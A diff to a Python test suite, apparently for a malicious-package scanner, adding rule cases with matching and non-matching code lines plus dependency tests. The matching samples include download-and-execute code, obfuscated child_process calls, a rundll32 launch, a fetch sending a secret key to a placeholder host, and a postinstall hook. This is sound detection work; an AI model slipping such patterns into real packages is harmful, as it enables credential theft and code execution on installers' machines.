@@ -20,6 +20,36 @@ HEX_RUN = "const s = \"" + "\\x41" * 50 + "\";"
 
 # rule id -> (path, line that must hit, line that must not hit)
 CASES = {
+    "py_download_exec": (
+        "pkg/__init__.py",
+        "import urllib.request, subprocess\nurllib.request.urlretrieve(U, '/tmp/x.pyz')\nopen('/tmp/x.pyz', 'wb')\nsubprocess.run(['python3', '/tmp/x.pyz'])",
+        "import urllib.request\ndata = urllib.request.urlopen(U).read()\nopen('out.json', 'wb').write(data)",
+    ),
+    "js_concat_require": (
+        "lib/x.js",
+        "require('chi'+'ld_pro'+'cess')['sp'+'awn']('x')",
+        "require('child_process').spawn('x')",
+    ),
+    "js_windows_lolbin": (
+        "install.js",
+        "cp.spawn('rundll32', [path.join(__dirname, 'helper.dll') + ',main'])",
+        "cp.spawn('node', [path.join(__dirname, 'build.js')])",
+    ),
+    "obf_escaped_invisible": (
+        "test/check.js",
+        "Function(\"" + ("var a" + "\\u200C" * 10 + ",") * 5 + "\")",
+        "const zwj = '\\u200C'; // joiner used in emoji tables",
+    ),
+    "js_secret_beacon": (
+        "lib/k.js",
+        "const b = bs58.encode(secretKey);\nfetch(\"https://example.invalid/q\", {method: 'POST', headers: {k: b}}).catch(() => {});",
+        "fetch(\"https://example.invalid/q\").then(r => r.json()).catch(() => {});",
+    ),
+    "npm_install_runs_test_file": (
+        "package.json",
+        '{"scripts": {"postinstall": "node test/check.js"}}',
+        '{"scripts": {"test": "node test/index.js"}}',
+    ),
     "gyp_command_exec": (
         "binding.gyp",
         '{"targets":[{"target_name":"x","sources":["<!(curl -s http://example.invalid/a)"]}]}',
@@ -168,7 +198,7 @@ CASES = {
     ),
 }
 # Rules whose test needs a real file on disk, not a line in the table.
-SEPARATE = {"utf16_code_file"}
+SEPARATE = {"utf16_code_file", "npm_phantom_dependency"}
 
 
 def _rule_ids(old: dict[str, str], new: dict[str, str]) -> set[str]:
@@ -403,3 +433,25 @@ def test_promoted_rules_load_with_a_test_and_evidence():
     for rule_id, level in pack.strong.items():
         assert rule_id in CASES
         assert level == "review"
+
+
+OLD_PKG = '{"name": "x", "version": "1.0.0", "dependencies": {"left-pad": "^1.0.0"}}'
+NEW_PKG = '{"name": "x", "version": "1.0.1", "dependencies": {"left-pad": "^1.0.0", "new-helper": "^4.2.1"}}'
+
+
+def test_phantom_dependency_hits_unused_new_dependency():
+    old = {"package.json": OLD_PKG, "index.js": "module.exports = require('left-pad');"}
+    new = {"package.json": NEW_PKG, "index.js": "module.exports = require('left-pad');"}
+    assert "npm_phantom_dependency" in _rule_ids(old, new)
+
+
+def test_phantom_dependency_skips_used_new_dependency():
+    old = {"package.json": OLD_PKG, "index.js": "module.exports = require('left-pad');"}
+    new = {"package.json": NEW_PKG, "index.js": "require('new-helper');\nmodule.exports = require('left-pad');"}
+    assert "npm_phantom_dependency" not in _rule_ids(old, new)
+
+
+def test_url_dependency_hits_git_hosted_dependency():
+    old = {"package.json": OLD_PKG}
+    new = {"package.json": '{"name": "x", "optionalDependencies": {"setup": "github:someone/repo#d446803f4c3b"}}'}
+    assert "npm_url_dependency" in _rule_ids(old, new)
